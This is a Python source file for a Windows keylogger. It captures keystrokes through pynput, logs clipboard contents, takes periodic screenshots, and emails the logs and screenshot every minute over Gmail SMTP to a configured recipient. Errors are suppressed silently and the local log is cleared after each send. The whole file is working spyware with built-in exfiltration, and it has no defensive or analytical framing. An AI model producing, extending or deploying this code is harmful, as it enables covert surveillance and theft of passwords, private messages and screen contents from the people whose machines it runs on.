import os
import time
import smtplib
from pynput import keyboard
import logging
import win32clipboard
from datetime import datetime
from PIL import ImageGrab
from email.message import EmailMessage

# ===== CONFIGURATION =====
LOG_INTERVAL = 60  # in seconds
LOG_FILE = "keylog_file.txt"
SCREENSHOT_NAME = "screenshot.png"

EMAIL_ADDRESS = "sender@gmail.com"
EMAIL_PASSWORD = "16_digit_app_password"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
RECIPIENT_EMAIL = "Receiver@gmail.com"

# ===== LOGGING SETUP =====
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

# ===== KEYSTROKE LOGGING =====
def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"{key}")

# ===== CLIPBOARD LOGGING =====
def log_clipboard():
    try:
        win32clipboard.OpenClipboard()
        clipboard_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if clipboard_data.strip():
            logging.info(f"[Clipboard] {clipboard_data}")
    except:
        pass  # Avoid unnecessary errors

# ===== SCREENSHOT =====
def take_screenshot():
    try:
        screenshot_path = os.path.join(os.getcwd(), SCREENSHOT_NAME)
        ImageGrab.grab().save(screenshot_path)
        return screenshot_path
    except:
        return None

# ===== EMAIL SENDER =====
def send_email(log_path, screenshot_path):
    try:
        with open(log_path, "r") as f:
            logs = f.read()

        if not logs.strip():
            return  # No logs to send

        msg = EmailMessage()
        msg['Subject'] = 'Keylogger Report with Screenshot'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = RECIPIENT_EMAIL
        msg.set_content(logs)

        if screenshot_path and os.path.exists(screenshot_path):
            with open(screenshot_path, 'rb') as img:
                msg.add_attachment(img.read(), maintype='image', subtype='png', filename=SCREENSHOT_NAME)

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)

    except Exception as e:
        pass  # Silently fail (or log to a file if needed)

# ===== MAIN LOOP =====
def start_monitoring():
    while True:
        log_clipboard()
        screenshot_path = take_screenshot()
        send_email(LOG_FILE, screenshot_path)

        with open(LOG_FILE, "w") as f:
            f.write("")

        time.sleep(LOG_INTERVAL)

def main():
    print("[*] Logger started. Press CTRL+C to stop.")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        start_monitoring()
    except KeyboardInterrupt:
        listener.stop()

if __name__ == "__main__":
    main()
